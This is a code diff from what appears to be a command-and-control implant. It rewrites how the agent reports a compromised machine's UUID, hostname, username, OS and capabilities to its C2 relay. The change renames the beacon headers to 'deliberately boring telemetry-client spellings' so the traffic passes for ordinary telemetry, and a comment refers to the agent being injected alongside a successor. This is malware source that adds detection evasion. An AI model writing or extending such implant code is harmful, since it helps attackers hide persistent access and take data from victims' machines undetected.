@@ -27,14 +27,16 @@ static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
  *
  * @details Identity travels as HTTP headers. The relay
  * copies these headers into its agent events and /status; the C2 consumes them as
- * typed fields without parsing anything binary. Two formats must stay stable:
- *  - X-Agent-Machine-Uuid: the machine UUID in its canonical RFC 9562 form
+ * typed fields without parsing anything binary. Header names are deliberately
+ * boring telemetry-client spellings (the relay also accepts the legacy X-Agent-*
+ * forms from pre-rename builds). Two formats must stay stable:
+ *  - X-Device-Id: the machine UUID in its canonical RFC 9562 form
  *    (8-4-4-4-12 lowercase) — the same value the host OS reports for the
  *    machine, so operators can cross-reference host inventories directly.
- *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
+ *  - X-Client-Features: the 8-byte capability-category bitmap as lowercase hex.
  *
  * @param info Populated SystemInfo (the same data the old Hello response carried).
- * @param sessionKey Per-RUNTIME session key (X-Agent-Session-Key): a fresh random UUID
+ * @param sessionKey Per-RUNTIME session key (X-Session-Id): a fresh random UUID
  *        minted once per process launch and reused on every reconnect — it names THIS
  *        runtime, not a connection, so the relay/C2 can tell agent runtimes apart on one
  *        machine while rows stay keyed by the machine uuid. Identifies, authorizes
@@ -57,26 +59,26 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, const CHAR *sessionKey
     // Each append fails cleanly (nullptr, cursor unchanged) when the buffer is
     // too small, so a single ok flag folds every overflow into one result.
     BOOL ok = true;
-    ok = ok && writer.WriteString("X-Agent-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Machine-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Device-Id: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
     // Per-RUNTIME key — NOT identity: rows stay keyed by the machine uuid above; a fresh
     // value per process launch distinguishes concurrent or succeeding runtimes on one
     // machine (e.g. this agent injected alongside a C# successor).
     if (sessionKey != nullptr && sessionKey[0] != '\0')
-        ok = ok && writer.WriteString("X-Agent-Session-Key: ") != nullptr && writer.WriteString(sessionKey) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Process-Arch: ") != nullptr && writer.WriteString(info.ProcessArchitecture) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Platform: ") != nullptr && writer.WriteString(info.AgentPlatform) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Os-Version: ") != nullptr && writer.WriteString(info.OSVersion) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Commit: ") != nullptr && writer.WriteString(AGENT_COMMIT_HASH) != nullptr && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Name-Id: ") != nullptr && WriteNumber(writer, AGENT_NAME_ID) && writer.WriteString("\r\n") != nullptr;
-    // No X-Agent-Bitness header: the process arch header already carries the full
+        ok = ok && writer.WriteString("X-Session-Id: ") != nullptr && writer.WriteString(sessionKey) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Device-Name: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-User-Id: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Device-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-App-Arch: ") != nullptr && writer.WriteString(info.ProcessArchitecture) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Platform: ") != nullptr && writer.WriteString(info.AgentPlatform) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-OS-Version: ") != nullptr && writer.WriteString(info.OSVersion) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-OS-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Client-Commit: ") != nullptr && writer.WriteString(AGENT_COMMIT_HASH) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Client-Id: ") != nullptr && WriteNumber(writer, AGENT_NAME_ID) && writer.WriteString("\r\n") != nullptr;
+    // No bitness header: the process arch header already carries the full
     // width, and x86_64/aarch64 are both 64-bit — a bare bit flag says nothing about
     // which.
-    ok = ok && writer.WriteString("X-Agent-Capabilities: ") != nullptr;
+    ok = ok && writer.WriteString("X-Client-Features: ") != nullptr;
     for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
     {
         CHAR byte[3] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF], '\0'};
